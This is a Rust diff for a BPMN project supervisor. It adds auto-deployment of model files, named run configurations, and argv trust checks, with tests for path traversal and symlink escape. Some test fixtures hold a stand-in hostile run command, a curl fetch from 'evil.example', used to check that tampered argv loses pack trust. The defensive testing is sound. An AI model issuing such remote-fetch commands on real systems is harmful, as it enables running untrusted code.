@@ -221,6 +221,14 @@ pub struct ProjectConfig {
     /// served-UI binary. Default `console`.
     #[serde(default = "default_app")]
     pub app: String,
+    /// Project-relative directories the supervisor sweeps for deployable
+    /// resources (`.bpmn`, `.dmn`, `.form`) each time Run is clicked, POSTing
+    /// each file to `<deployTarget>/v2/deployments`. Default is
+    /// `["models", "decisions", "forms"]`; templates or pack scaffolders can
+    /// override. Set to `[]` to disable — useful when the app deploys its
+    /// own resources at boot.
+    #[serde(default = "default_auto_deploy")]
+    pub auto_deploy: Vec<String>,
     /// Toolchain snapshotted from the scaffolding pack — the *project* is the
     /// authority for how it runs and compiles, not the pack (which can change
     /// or be uninstalled). Precedence for Run/Compile:
@@ -252,13 +260,42 @@ pub struct ProjectConfig {
 #[serde(rename_all = "camelCase")]
 pub struct ProjectToolchain {
     /// Argv the "Run" button spawns in the project dir. Empty => fall through
-    /// to the lang-pack toolchain / Deno runner.
+    /// to the lang-pack toolchain / Deno runner. Also serves as a fallback
+    /// when a run config is active but its own `run` argv is empty.
     #[serde(default)]
     pub run: Vec<String>,
     /// Argv the "Compile" button spawns in the project dir. Empty => fall
-    /// through to the lang-pack toolchain / Deno compile.
+    /// through to the lang-pack toolchain / Deno compile. Also serves as a
+    /// fallback when a run config is active but its own `compile` is empty.
     #[serde(default)]
     pub compile: Vec<String>,
+    /// Named run configurations snapshotted from the scaffolding pack.
+    /// The Console offers these in a Run/Target dropdown; the picked id
+    /// is persisted in `active_run_config`. Users may hand-edit — argv
+    /// unrecognised by the source pack fall back to `cfg.lang` trust.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub run_configs: Vec<ProjectRunConfig>,
+    /// Id of the currently-selected `run_configs` entry. When `None` and
+    /// `run_configs` is non-empty, the `default: true` entry (or the first)
+    /// is used.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub active_run_config: Option<String>,
+}
+
+/// Project-owned copy of a pack's [`super::extensions::RunConfig`].
+#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq, Default)]
+#[serde(rename_all = "camelCase")]
+pub struct ProjectRunConfig {
+    pub id: String,
+    pub label: String,
+    #[serde(default)]
+    pub default: bool,
+    #[serde(default)]
+    pub run: Vec<String>,
+    #[serde(default)]
+    pub compile: Vec<String>,
+    #[serde(default)]
+    pub env: std::collections::BTreeMap<String, String>,
 }
 
 /// Breadcrumb identifying the pack that scaffolded a project — origin +
@@ -273,6 +310,30 @@ pub struct ScaffoldedFrom {
     /// `package.json` wasn't readable at scaffold time).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub version: Option<String>,
+}
+
+/// Snapshot a pack's toolchain — the argv (flat + configs) the supervisor
+/// spawns — into a project-owned copy. Mirrors the fields; drops the pack-
+/// only metadata (`detect`, `targets`, install hints).
+fn project_toolchain_from_pack(m: &super::extensions::ExtManifest) -> ProjectToolchain {
+    ProjectToolchain {
+        run: m.toolchain.run.clone(),
+        compile: m.toolchain.compile.clone(),
+        run_configs: m
+            .toolchain
+            .run_configs
+            .iter()
+            .map(|rc| ProjectRunConfig {
+                id: rc.id.clone(),
+                label: rc.label.clone(),
+                default: rc.default,
+                run: rc.run.clone(),
+                compile: rc.compile.clone(),
+                env: rc.env.clone(),
+            })
+            .collect(),
+        active_run_config: None,
+    }
 }
 
 fn default_deploy_target() -> String {
@@ -291,6 +352,14 @@ fn default_app() -> String {
     "console".to_string()
 }
 
+fn default_auto_deploy() -> Vec<String> {
+    vec![
+        "models".to_string(),
+        "decisions".to_string(),
+        "forms".to_string(),
+    ]
+}
+
 impl ProjectConfig {
     fn new(name: &str, description: &str) -> Self {
         let ts = now_ms();
@@ -302,6 +371,7 @@ impl ProjectConfig {
             platforms: vec![host_target().to_string()],
             lang: default_lang(),
             app: default_app(),
+            auto_deploy: default_auto_deploy(),
             toolchain: None,
             scaffolded_from: None,
             created_ms: ts,
@@ -372,13 +442,13 @@ fn autoheal_toolchain(cfg: &mut ProjectConfig) {
     let Some(m) = super::extensions::find_ext(pack_id) else {
         return;
     };
-    if m.toolchain.run.is_empty() && m.toolchain.compile.is_empty() {
+    if m.toolchain.run.is_empty()
+        && m.toolchain.compile.is_empty()
+        && m.toolchain.run_configs.is_empty()
+    {
         return;
     }
-    cfg.toolchain = Some(ProjectToolchain {
-        run: m.toolchain.run.clone(),
-        compile: m.toolchain.compile.clone(),
-    });
+    cfg.toolchain = Some(project_toolchain_from_pack(&m));
     cfg.scaffolded_from = Some(ScaffoldedFrom {
         pack: m.id.clone(),
         version: super::extensions::pack_version(&m.id),
@@ -1172,11 +1242,11 @@ pub fn create_project(
         // Snapshot the pack's toolchain into the project so pack updates or
         // uninstalls don't break existing projects — the project owns its
         // run/compile invocation from this point on.
-        if !m.toolchain.run.is_empty() || !m.toolchain.compile.is_empty() {
-            cfg.toolchain = Some(ProjectToolchain {
-                run: m.toolchain.run.clone(),
-                compile: m.toolchain.compile.clone(),
-            });
+        if !m.toolchain.run.is_empty()
+            || !m.toolchain.compile.is_empty()
+            || !m.toolchain.run_configs.is_empty()
+        {
+            cfg.toolchain = Some(project_toolchain_from_pack(&m));
         }
         cfg.scaffolded_from = Some(ScaffoldedFrom {
             pack: m.id.clone(),
@@ -1623,19 +1693,80 @@ enum ArgvKind {
     Compile,
 }
 
+/// Picks the active [`ProjectRunConfig`] on the project, or `None` if there
+/// are no run configs. Precedence: `active_run_config` id match → the entry
+/// flagged `default: true` → the first entry.
+fn active_run_config(tc: &ProjectToolchain) -> Option<&ProjectRunConfig> {
+    if tc.run_configs.is_empty() {
+        return None;
+    }
+    if let Some(id) = tc.active_run_config.as_deref()
+        && let Some(rc) = tc.run_configs.iter().find(|rc| rc.id == id)
+    {
+        return Some(rc);
+    }
+    tc.run_configs
+        .iter()
+        .find(|rc| rc.default)
+        .or_else(|| tc.run_configs.first())
+}
+
+/// Best-effort trust check for run-config argv: allow if the currently-
+/// installed scaffolding pack still declares an identical `run`/`compile`
+/// argv on any of its `run_configs`. Same semantics as [`snapshot_trust_id`].
+fn snapshot_trust_id_for_config(
+    cfg: &ProjectConfig,
+    snapshot_argv: &[String],
+    kind: ArgvKind,
+) -> String {
+    if let Some(sf) = cfg.scaffolded_from.as_ref()
+        && let Some(m) = super::extensions::find_ext(&sf.pack)
+    {
+        let matches = m.toolchain.run_configs.iter().any(|rc| {
+            let declared = match kind {
+                ArgvKind::Run => &rc.run,
+                ArgvKind::Compile => &rc.compile,
+            };
+            !declared.is_empty() && declared.as_slice() == snapshot_argv
+        });
+        if matches {
+            return sf.pack.clone();
+        }
+        // Fall through to the flat check — a hand-edited or pack-updated
+        // project might still match the pack's top-level run/compile.
+        let declared = match kind {
+            ArgvKind::Run => &m.toolchain.run,
+            ArgvKind::Compile => &m.toolchain.compile,
+        };
+        if !declared.is_empty() && declared.as_slice() == snapshot_argv {
+            return sf.pack.clone();
+        }
+    }
+    cfg.lang.clone()
+}
+
 /// Resolves the Run argv + the trust-store ext id gating it, in order:
-///   1. `cfg.toolchain.run` snapshotted at scaffold time — trust binds to
+///   1. Active [`ProjectRunConfig`] (when the project has run configs) —
+///      its `run` argv wins; trust binds to the scaffolding pack when the
+///      pack still declares it, else to `cfg.lang`.
+///   2. `cfg.toolchain.run` snapshotted at scaffold time — trust binds to
 ///      `scaffoldedFrom.pack` only when the installed pack still declares the
 ///      identical argv (see [`snapshot_trust_id`]); otherwise `cfg.lang`.
-///   2. Lang pack's `toolchain.run` (covers lang-pack starter templates that
+///   3. Lang pack's `toolchain.run` (covers lang-pack starter templates that
 ///      don't override, e.g. plain Rust) — trust binds to the lang pack.
-///   3. `None` — the caller falls through to the built-in Deno runner.
+///   4. `None` — the caller falls through to the built-in Deno runner.
 fn resolve_run_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
-    if let Some(tc) = cfg.toolchain.as_ref()
-        && !tc.run.is_empty()
-    {
-        let trust = snapshot_trust_id(cfg, &tc.run, ArgvKind::Run);
-        return Some((tc.run.clone(), trust));
+    if let Some(tc) = cfg.toolchain.as_ref() {
+        if let Some(rc) = active_run_config(tc)
+            && !rc.run.is_empty()
+        {
+            let trust = snapshot_trust_id_for_config(cfg, &rc.run, ArgvKind::Run);
+            return Some((rc.run.clone(), trust));
+        }
+        if !tc.run.is_empty() {
+            let trust = snapshot_trust_id(cfg, &tc.run, ArgvKind::Run);
+            return Some((tc.run.clone(), trust));
+        }
     }
     if cfg.lang != "deno"
         && let Some(pack) = super::extensions::lang_pack(&cfg.lang)
@@ -1648,11 +1779,17 @@ fn resolve_run_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
 
 /// Same precedence as [`resolve_run_argv`], but for `toolchain.compile`.
 fn resolve_compile_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
-    if let Some(tc) = cfg.toolchain.as_ref()
-        && !tc.compile.is_empty()
-    {
-        let trust = snapshot_trust_id(cfg, &tc.compile, ArgvKind::Compile);
-        return Some((tc.compile.clone(), trust));
+    if let Some(tc) = cfg.toolchain.as_ref() {
+        if let Some(rc) = active_run_config(tc)
+            && !rc.compile.is_empty()
+        {
+            let trust = snapshot_trust_id_for_config(cfg, &rc.compile, ArgvKind::Compile);
+            return Some((rc.compile.clone(), trust));
+        }
+        if !tc.compile.is_empty() {
+            let trust = snapshot_trust_id(cfg, &tc.compile, ArgvKind::Compile);
+            return Some((tc.compile.clone(), trust));
+        }
     }
     if cfg.lang != "deno"
         && let Some(pack) = super::extensions::lang_pack(&cfg.lang)
@@ -1661,6 +1798,16 @@ fn resolve_compile_argv(cfg: &ProjectConfig) -> Option<(Vec<String>, String)> {
         return Some((pack.toolchain.compile.clone(), pack.id));
     }
     None
+}
+
+/// Env vars to layer on top of the base environment when spawning Run/Compile
+/// — the active [`ProjectRunConfig`]'s `env`, or empty when no run configs.
+fn resolve_run_env(cfg: &ProjectConfig) -> std::collections::BTreeMap<String, String> {
+    cfg.toolchain
+        .as_ref()
+        .and_then(active_run_config)
+        .map(|rc| rc.env.clone())
+        .unwrap_or_default()
 }
 
 pub fn supervisor() -> &'static ProjectSupervisor {
@@ -1711,6 +1858,197 @@ impl ProjectSupervisor {
         }
     }
 
+    /// Enumerates deployable resource files under a project directory.
+    ///
+    /// For each configured subdirectory: rejects any value with non-`Normal`
+    /// path components (`..`, absolute paths, root, prefix) so an
+    /// attacker-controlled `nanobpm.project.json` can't traverse out of the
+    /// project. Then canonicalises the resolved subdirectory and requires it
+    /// to sit under the canonicalised project root — symlink chases can't
+    /// escape either. Non-existent / non-directory / non-canonicalisable
+    /// entries are silently skipped (a project without a `decisions/` dir is
+    /// normal, not an error).
+    ///
+    /// Files are matched by extension (`.bpmn`, `.dmn`, `.form`) and sorted
+    /// within each directory so log lines / deployment order are stable
+    /// across filesystems.
+    ///
+    /// Pure: no HTTP, no logs. Kept out of `auto_deploy_resources` for tests.
+    async fn discover_deployables(project_dir: &Path, dirs: &[String]) -> Vec<PathBuf> {
+        let root_canonical = match tokio::fs::canonicalize(project_dir).await {
+            Ok(p) => p,
+            Err(_) => return Vec::new(),
+        };
+        let mut files: Vec<PathBuf> = Vec::new();
+        for sub in dirs {
+            let sub_path = Path::new(sub);
+            // Reject `..`, absolute paths, drive prefixes, etc. Only ordinary
+            // "look in this named directory" values are accepted.
+            let clean = sub_path
+                .components()
+                .all(|c| matches!(c, std::path::Component::Normal(_)));
+            if !clean {
+                continue;
+            }
+            let joined = root_canonical.join(sub_path);
+            let resolved = match tokio::fs::canonicalize(&joined).await {
+                Ok(p) => p,
+                Err(_) => continue, // missing dir is expected
+            };
+            if !resolved.starts_with(&root_canonical) {
+                // Symlink chain escaped the project root — refuse to sweep.
+                continue;
+            }
+            if !resolved.is_dir() {
+                continue;
+            }
+            let mut rd = match tokio::fs::read_dir(&resolved).await {
+                Ok(rd) => rd,
+                Err(_) => continue,
+            };
+            let mut names: Vec<String> = Vec::new();
+            while let Ok(Some(entry)) = rd.next_entry().await {
+                if !entry
+                    .file_type()
+                    .await
+                    .ok()
+                    .map(|t| t.is_file())
+                    .unwrap_or(false)
+                {
+                    continue;
+                }
+                let Some(name) = entry.file_name().into_string().ok() else {
+                    continue;
+                };
+                let lower = name.to_ascii_lowercase();
+                if lower.ends_with(".bpmn") || lower.ends_with(".dmn") || lower.ends_with(".form") {
+                    names.push(name);
+                }
+            }
+            names.sort();
+            for n in names {
+                files.push(resolved.join(n));
+            }
+        }
+        files
+    }
+
+    /// Sweeps the configured `auto_deploy` dirs (default `models/`, `decisions/`,
+    /// `forms/`) for `.bpmn`, `.dmn`, `.form` files and POSTs each one to
+    /// `<base_url>/v2/deployments` as multipart. Streams progress to the project
+    /// log so users see each deployment (or failure) in the Output pane.
+    ///
+    /// Deliberately best-effort: a failing deploy logs and moves on, and the
+    /// app is still started — the alternative would be that a temporarily-down
+    /// gateway blocks running a self-hosting app entirely. Templates that need
+    /// deploy-strict semantics can turn this off (`autoDeploy: []`) and drive
+    /// deployment from their own bootstrap.
+    async fn auto_deploy_resources(
+        cfg: &ProjectConfig,
+        dir: &Path,
+        base_url: &str,
+        inner: &Arc<ProjectInner>,
+    ) {
+        let dirs = &cfg.auto_deploy;
+        if dirs.is_empty() {
+            return;
+        }
+        let files = Self::discover_deployables(dir, dirs).await;
+        if files.is_empty() {
+            return;
+        }
+        let client = match reqwest::Client::builder()
+            .timeout(std::time::Duration::from_secs(10))
+            .build()
+        {
+            Ok(c) => c,
+            Err(e) => {
+                inner
+                    .push_log(
+                        "err",
+                        format!("auto-deploy: could not build http client: {e}"),
+                    )
+                    .await;
+                return;
+            }
+        };
+        let url = format!("{}/v2/deployments", base_url.trim_end_matches('/'));
+        inner
+            .push_log(
+                "sys",
+                format!("auto-deploy: {} resource(s) -> {url}", files.len()),
+            )
+            .await;
+        for path in &files {
+            let rel = path.strip_prefix(dir).unwrap_or(path).display().to_string();
+            let name = path
+                .file_name()
+                .and_then(|s| s.to_str())
+                .unwrap_or("resource")
+                .to_string();
+            let bytes = match tokio::fs::read(path).await {
+                Ok(b) => b,
+                Err(e) => {
+                    inner
+                        .push_log("err", format!("auto-deploy: {rel}: read failed: {e}"))
+                        .await;
+                    continue;
+                }
+            };
+            let mime = if name.to_ascii_lowercase().ends_with(".form") {
+                "application/json"
+            } else {
+                "text/xml"
+            };
+            let part = match reqwest::multipart::Part::bytes(bytes)
+                .file_name(name.clone())
+                .mime_str(mime)
+            {
+                Ok(p) => p,
+                Err(e) => {
+                    inner
+                        .push_log("err", format!("auto-deploy: {rel}: {e}"))
+                        .await;
+                    continue;
+                }
+            };
+            let form = reqwest::multipart::Form::new().part("resources", part);
+            match client.post(&url).multipart(form).send().await {
+                Ok(resp) if resp.status().is_success() => {
+                    inner
+                        .push_log("sys", format!("auto-deploy: deployed {rel}"))
+                        .await;
+                }
+                Ok(resp) => {
+                    let status = resp.status();
+                    // Cap the read so an unfriendly proxy (nginx HTML error page,
+                    // a huge JSON blob) can't balloon memory just to log one line.
+                    const MAX_ERR_BODY: u64 = 4 * 1024;
+                    let short_body = if resp.content_length().unwrap_or(0) > MAX_ERR_BODY {
+                        String::new()
+                    } else {
+                        resp.text().await.unwrap_or_default()
+                    };
+                    let body = short_body
+                        .lines()
+                        .next()
+                        .unwrap_or("")
+                        .chars()
+                        .take(200)
+                        .collect::<String>();
+                    inner
+                        .push_log("err", format!("auto-deploy: {rel}: HTTP {status} {body}"))
+                        .await;
+                }
+                Err(e) => {
+                    inner
+                        .push_log("err", format!("auto-deploy: {rel}: {e}"))
+                        .await;
+                }
+            }
+        }
+    }
+
     /// Spawns `deno run main.ts` for a project. Idempotent if already running.
     pub async fn run(&self, name: &str) -> Result<(), String> {
         let dir = project_dir(name).ok_or("invalid project name")?;
@@ -1751,6 +2089,8 @@ impl ProjectSupervisor {
         let _ = std::fs::create_dir_all(&cache);
         let base_url = Self::base_url(&cfg);
 
+        Self::auto_deploy_resources(&cfg, &dir, &base_url, &inner).await;
+
         let mut cmd = Command::new(&deno);
         cmd.current_dir(&dir)
             .arg("run")
@@ -1767,6 +2107,14 @@ impl ProjectSupervisor {
             .stdout(std::process::Stdio::piped())
             .stderr(std::process::Stdio::piped())
             .kill_on_drop(true);
+        // Even when the toolchain argv resolves to the built-in Deno runner,
+        // an active run config's `env` must still be honored — otherwise
+        // env-only runConfigs (e.g. different NANOBPMN_BASE_URL per target)
+        // silently no-op for Deno projects. Same precedence as run_toolchain:
+        // base spawn env above, then active-config env last-wins.
+        for (k, v) in resolve_run_env(&cfg) {
+            cmd.env(k, v);
+        }
 
         let mut child = match cmd.spawn() {
             Ok(c) => c,
@@ -1886,6 +2234,7 @@ impl ProjectSupervisor {
         *inner.phase.lock().await = Phase::Starting;
         let dir = std::fs::canonicalize(dir).unwrap_or_else(|_| dir.to_path_buf());
         let base_url = Self::base_url(cfg);
+        Self::auto_deploy_resources(cfg, &dir, &base_url, &inner).await;
         let mut cmd = Command::new(&bin);
         cmd.current_dir(&dir)
             .args(&argv[1..])
@@ -1895,6 +2244,11 @@ impl ProjectSupervisor {
             .stdout(std::process::Stdio::piped())
             .stderr(std::process::Stdio::piped())
             .kill_on_drop(true);
+        // Layer the active run-config's env on top — overrides on key clash so
+        // configs can, e.g., pin CAMUNDA_REST_ADDRESS per combo.
+        for (k, v) in resolve_run_env(cfg) {
+            cmd.env(k, v);
+        }
         let mut child = match cmd.spawn() {
             Ok(c) => c,
             Err(e) => {
@@ -2055,6 +2409,12 @@ impl ProjectSupervisor {
                 .stdin(std::process::Stdio::null())
                 .stdout(std::process::Stdio::piped())
                 .stderr(std::process::Stdio::piped());
+            // Layer active run-config env onto the built-in Deno compile too;
+            // otherwise env-only runConfigs no-op on Deno projects during
+            // Compile (see run() for the symmetric fix and rationale).
+            for (k, v) in resolve_run_env(&cfg) {
+                cmd.env(k, v);
+            }
 
             let child = cmd
                 .spawn()
@@ -2125,7 +2485,7 @@ impl ProjectSupervisor {
     async fn compile_toolchain(
         &self,
         name: &str,
-        _cfg: &ProjectConfig,
+        cfg: &ProjectConfig,
         dir: &Path,
         argv: Vec<String>,
         trust_ext_id: String,
@@ -2154,6 +2514,9 @@ impl ProjectSupervisor {
             .stdin(std::process::Stdio::null())
             .stdout(std::process::Stdio::piped())
             .stderr(std::process::Stdio::piped());
+        for (k, v) in resolve_run_env(cfg) {
+            cmd.env(k, v);
+        }
         let result = match cmd.spawn() {
             Ok(mut child) => {
                 if let Some(o) = child.stdout.take() {
@@ -2230,6 +2593,120 @@ mod tests {
         assert!(safe_project_path("app", "a/../b").is_none());
         assert!(safe_project_path("app", "resources/processes/x.bpmn").is_some());
         assert!(safe_project_path("../bad", "x").is_none());
+    }
+
+    // --- discover_deployables --------------------------------------------
+
+    fn touch(path: &Path, body: &str) {
+        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
+        std::fs::write(path, body).unwrap();
+    }
+
+    /// A unique temp dir that doesn't touch `NANOBPMN_PROJECTS_DIR`, so async
+    /// tests don't need to hold a std Mutex across `.await`.
+    fn scratch_dir(tag: &str) -> PathBuf {
+        static N: AtomicU64 = AtomicU64::new(0);
+        let p = std::env::temp_dir().join(format!(
+            "nano-discover-{}-{}-{}",
+            tag,
+            std::process::id(),
+            N.fetch_add(1, AOrd::Relaxed)
+        ));
+        let _ = std::fs::remove_dir_all(&p);
+        std::fs::create_dir_all(&p).unwrap();
+        p
+    }
+
+    #[tokio::test]
+    async fn discover_finds_configured_extensions_sorted_per_dir() {
+        let root = scratch_dir("sorted").join("p1");
+        std::fs::create_dir_all(&root).unwrap();
+        touch(&root.join("models/onboarding.bpmn"), "<x/>");
+        touch(&root.join("models/adhoc.bpmn"), "<x/>");
+        touch(&root.join("models/README.md"), "not deployable");
+        touch(&root.join("decisions/pricing.dmn"), "<x/>");
+        touch(&root.join("forms/consent.form"), "{}");
+        // Case-insensitive extension match, still picked up.
+        touch(&root.join("models/EDGE.BPMN"), "<x/>");
+
+        let dirs = vec!["models".into(), "decisions".into(), "forms".into()];
+        let files = ProjectSupervisor::discover_deployables(&root, &dirs).await;
+        let names: Vec<_> = files
+            .iter()
+            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
+            .collect();
+        assert_eq!(
+            names,
+            vec![
+                "EDGE.BPMN",
+                "adhoc.bpmn",
+                "onboarding.bpmn",
+                "pricing.dmn",
+                "consent.form",
+            ],
+            "files must group by configured dir + sort within each"
+        );
+    }
+
+    #[tokio::test]
+    async fn discover_empty_list_disables_sweep() {
+        let root = scratch_dir("empty").join("p2");
+        std::fs::create_dir_all(&root).unwrap();
+        touch(&root.join("models/x.bpmn"), "<x/>");
+        let files = ProjectSupervisor::discover_deployables(&root, &[]).await;
+        assert!(files.is_empty(), "autoDeploy: [] must skip discovery");
+    }
+
+    #[tokio::test]
+    async fn discover_rejects_dotdot_traversal() {
+        let sandbox = scratch_dir("dotdot").join("sandbox");
+        std::fs::create_dir_all(&sandbox).unwrap();
+        // A "leak" dir outside the project that contains a bpmn file the
+        // attacker would like to exfiltrate.
+        touch(&sandbox.join("leak/secret.bpmn"), "<pwned/>");
+        let root = sandbox.join("project");
+        std::fs::create_dir_all(&root).unwrap();
+        touch(&root.join("models/legit.bpmn"), "<ok/>");
+
+        let dirs = vec!["../leak".into(), "models".into()];
+        let files = ProjectSupervisor::discover_deployables(&root, &dirs).await;
+        let names: Vec<_> = files
+            .iter()
+            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
+            .collect();
+        assert_eq!(names, vec!["legit.bpmn"], "'../leak' must be rejected");
+    }
+
+    #[tokio::test]
+    async fn discover_rejects_absolute_paths() {
+        let root = scratch_dir("abs").join("p3");
+        std::fs::create_dir_all(&root).unwrap();
+        touch(&root.join("models/x.bpmn"), "<x/>");
+
+        let dirs = vec!["/etc".into(), "models".into()];
+        let files = ProjectSupervisor::discover_deployables(&root, &dirs).await;
+        let names: Vec<_> = files
+            .iter()
+            .map(|p| p.file_name().unwrap().to_string_lossy().into_owned())
+            .collect();
+        assert_eq!(names, vec!["x.bpmn"], "absolute paths must be rejected");
+    }
+
+    #[tokio::test]
+    async fn discover_symlink_escape_rejected() {
+        let sandbox = scratch_dir("symlink").join("sandbox2");
+        std::fs::create_dir_all(&sandbox).unwrap();
+        touch(&sandbox.join("outside/secret.bpmn"), "<pwned/>");
+        let root = sandbox.join("project");
+        std::fs::create_dir_all(&root).unwrap();
+        // symlink `models` in the project to a directory *outside* the project.
+        #[cfg(unix)]
+        {
+            std::os::unix::fs::symlink(sandbox.join("outside"), root.join("models"))
+                .expect("symlink");
+            let files = ProjectSupervisor::discover_deployables(&root, &["models".into()]).await;
+            assert!(files.is_empty(), "symlink escape must be rejected");
+        }
     }
 
     #[test]
@@ -2591,6 +3068,8 @@ mod tests {
         cfg.toolchain = Some(ProjectToolchain {
             run: vec!["mvn".into(), "-f".into(), "microservice/pom.xml".into()],
             compile: vec![],
+            run_configs: vec![],
+            active_run_config: None,
         });
         cfg.scaffolded_from = Some(ScaffoldedFrom {
             pack: "embedded-jvm".into(),
@@ -2631,6 +3110,8 @@ mod tests {
         cfg.toolchain = Some(ProjectToolchain {
             run: vec!["curl".into(), "https://evil.example/x.sh".into()],
             compile: vec![],
+            run_configs: vec![],
+            active_run_config: None,
         });
         cfg.scaffolded_from = Some(ScaffoldedFrom {
             pack: "embedded-jvm".into(),
@@ -2648,6 +3129,125 @@ mod tests {
         let cfg = ProjectConfig::new("p", "");
         assert!(resolve_run_argv(&cfg).is_none());
         assert!(resolve_compile_argv(&cfg).is_none());
+    }
+
+    // ---- run-configs (issue #42) -------------------------------------------
+
+    fn tc_with_configs(configs: Vec<ProjectRunConfig>) -> ProjectToolchain {
+        ProjectToolchain {
+            run: vec!["mvn".into(), "-q".into()],
+            compile: vec!["mvn".into(), "-DskipTests".into(), "package".into()],
+            run_configs: configs,
+            active_run_config: None,
+        }
+    }
+
+    fn rc(id: &str, def: bool, arg: &str) -> ProjectRunConfig {
+        ProjectRunConfig {
+            id: id.into(),
+            label: id.into(),
+            default: def,
+            run: vec!["mvn".into(), format!("-P{arg}"), "exec:java".into()],
+            compile: vec!["mvn".into(), format!("-P{arg}"), "package".into()],
+            env: [("PROFILE".into(), arg.into())].into_iter().collect(),
+        }
+    }
+
+    #[test]
+    fn active_run_config_prefers_explicit_pin_over_default_flag() {
+        let mut tc = tc_with_configs(vec![rc("a", true, "stock"), rc("b", false, "falcon")]);
+        tc.active_run_config = Some("b".into());
+        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("b"));
+    }
+
+    #[test]
+    fn active_run_config_falls_back_to_default_flag_then_first() {
+        // With no pin, the `default: true` entry wins even when it isn't first.
+        let tc = tc_with_configs(vec![rc("a", false, "stock"), rc("b", true, "falcon")]);
+        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("b"));
+        // With no default flagged, the first entry wins.
+        let tc = tc_with_configs(vec![rc("a", false, "stock"), rc("b", false, "falcon")]);
+        assert_eq!(active_run_config(&tc).map(|r| r.id.as_str()), Some("a"));
+    }
+
+    #[test]
+    fn active_run_config_none_for_empty_list() {
+        let tc = tc_with_configs(vec![]);
+        assert!(active_run_config(&tc).is_none());
+    }
+
+    #[test]
+    fn resolve_run_argv_prefers_active_run_config_over_flat_run() {
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.lang = "java".into();
+        cfg.toolchain = Some(tc_with_configs(vec![
+            rc("stock-rest", true, "stock"),
+            rc("falcon-nano", false, "falcon"),
+        ]));
+        cfg.toolchain.as_mut().unwrap().active_run_config = Some("falcon-nano".into());
+        let (argv, _trust) = resolve_run_argv(&cfg).expect("resolves");
+        assert!(
+            argv.contains(&"-Pfalcon".into()),
+            "picked argv should come from active run config, got: {argv:?}"
+        );
+    }
+
+    #[test]
+    fn resolve_run_env_returns_active_run_config_env() {
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.toolchain = Some(tc_with_configs(vec![rc("falcon", true, "falcon")]));
+        let env = resolve_run_env(&cfg);
+        assert_eq!(env.get("PROFILE").map(|s| s.as_str()), Some("falcon"));
+    }
+
+    #[test]
+    fn resolve_run_env_empty_without_run_configs() {
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.lang = "java".into();
+        cfg.toolchain = Some(ProjectToolchain {
+            run: vec!["mvn".into()],
+            compile: vec![],
+            run_configs: vec![],
+            active_run_config: None,
+        });
+        assert!(resolve_run_env(&cfg).is_empty());
+    }
+
+    #[test]
+    fn snapshot_trust_id_for_config_credits_pack_when_config_argv_matches() {
+        let _g = lock();
+        let ext = temp_root().join("ext-store");
+        let pack = ext.join("nanobpm__example-java-throughput");
+        std::fs::create_dir_all(&pack).unwrap();
+        std::fs::write(
+            pack.join("nano-ide.ext.json"),
+            r#"{"id":"java-throughput","kind":"example","displayName":"T",
+                 "toolchain":{"runConfigs":[
+                   {"id":"stock","label":"Stock","run":["mvn","-Pstock","exec:java"]}
+                 ]}}"#,
+        )
+        .unwrap();
+        unsafe { std::env::set_var("NANOBPMN_EXTENSIONS_DIR", &ext) };
+
+        let mut cfg = ProjectConfig::new("p", "");
+        cfg.lang = "java".into();
+        cfg.scaffolded_from = Some(ScaffoldedFrom {
+            pack: "java-throughput".into(),
+            version: None,
+        });
+        let argv = vec!["mvn".into(), "-Pstock".into(), "exec:java".into()];
+        assert_eq!(
+            snapshot_trust_id_for_config(&cfg, &argv, ArgvKind::Run),
+            "java-throughput",
+            "pack still declares this argv on a runConfig → trust binds to it",
+        );
+        // Tampered / hand-edited argv: falls back to lang trust.
+        let tampered = vec!["curl".into(), "evil".into()];
+        assert_eq!(
+            snapshot_trust_id_for_config(&cfg, &tampered, ArgvKind::Run),
+            "java",
+        );
+        unsafe { std::env::remove_var("NANOBPMN_EXTENSIONS_DIR") };
     }
 
     #[test]
